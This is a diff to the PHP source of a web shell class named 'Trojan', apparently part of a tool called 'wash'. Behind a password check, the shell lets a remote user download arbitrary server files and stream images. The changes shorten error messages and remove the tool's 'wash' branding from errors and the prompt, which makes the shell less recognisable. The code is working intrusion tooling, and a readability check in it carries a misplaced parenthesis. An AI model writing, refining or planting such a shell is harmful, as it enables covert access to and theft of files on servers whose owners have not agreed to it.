@@ -46,8 +46,8 @@ class Trojan{
             # if the method doesn't exist, send back an error message
             else {
                 $this->response = array(
-                    'error'          => "wash error: method $method is unsupported.",
-                    'output'         => "wash error: method $method is unsupported.",
+                    'error'          => "$method unsupported.",
+                    'output'         => "$method unsupported.",
                     'prompt_context' => $this->prompt_context,
                 );
                 $this->send_response();
@@ -130,19 +130,13 @@ class Trojan{
         chdir($this->cwd);
         # if the requested file exists, serve it up to the user
         if(file_exists($args['file'])){
-            //header('Content-Description: File Transfer');
-            //header('Content-Type: application/octet-stream');
             header('Content-Disposition: attachment; filename='.basename($args['file']));
             header('Content-Transfer-Encoding: binary');
-            //header('Expires: 0');
-            //header('Cache-Control: must-revalidate');
-            //header('Pragma: public');
-            //header('Content-Length: ' . filesize($args['file']));
             readfile($args['file']);
         }
         
         # if not, provide a notification
-        else { echo "The requested file does not exist."; }
+        else { echo "File does not exist."; }
         die();
     }
 
@@ -158,7 +152,7 @@ class Trojan{
         # possible.)
         if(!is_readable($args['file'] || !file_exists($args['file']))){
             $this->response = array(
-                'error'          => 'The specified file is not readable or does not exist.',
+                'error'          => 'File is not readable or does not exist.',
                 'prompt_context' => $this->prompt_context,
             );
             $this->send_response();
@@ -226,15 +220,11 @@ class Trojan{
             # extract some image information
             $image_data = getimagesize($args['file']);
             header("Content-Type: {$image_data['mime']}");
-            //header("Expires: 0");
-            //header("Cache-Control: must-revalidate");
-            //header("Pragma: public");
-            //header("Content-Length: " . filesize($file));
             readfile($args['file']);
         }
         
         # if not, provide a notification
-        else { echo "The requested file does not exist."; }
+        else { echo "File does not exist."; }
         die();
     }
 }
@@ -253,7 +243,7 @@ else {
     die(json_encode(
         array(
             'error'          => 'Invalid password.',
-            'prompt_context' => 'wash>',
+            //'prompt_context' => 'wash>',
         )
     ));
 }
